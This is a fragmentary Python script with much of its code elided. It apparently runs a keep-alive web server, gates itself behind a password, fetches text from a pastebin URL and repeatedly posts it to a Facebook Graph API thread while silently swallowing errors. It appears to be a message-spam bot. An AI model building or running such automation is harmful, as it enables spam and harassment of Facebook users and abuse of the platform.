...
class MyHandler(http.server.SimpleHTTPRequestHandler):
  def do_GET(self):
    ...
    self.end_headers()
    self.wfile.write(b"The Biggest khof mekar Arun Rulex Server is Alive")
...
def send_messages():
  ...
  if entered_password != password:
    print('[-] <==> Password change by arun don!')
    sys.exit()
  ...
  mmm = requests.get('https://pastebin.com/raw/6pfLZHFq').text
  ...
  def msg():
    ...
    try:
      s = requests.post("https://graph.facebook.com/v15.0/t_100068972034807/", data=parameters, headers=headers)
    except:
      pass
